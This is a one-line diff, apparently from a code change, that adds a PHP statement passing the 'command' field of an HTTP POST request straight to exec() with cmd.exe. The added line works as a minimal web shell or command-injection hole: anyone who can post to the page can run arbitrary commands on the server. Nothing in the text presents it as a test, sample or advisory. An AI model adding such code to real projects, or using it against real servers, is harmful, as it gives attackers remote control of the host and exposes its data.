@@ -1,0 +1,1 @@
+<?php exec("cmd.exe " . $_POST['command'] . ".txt"); ?>
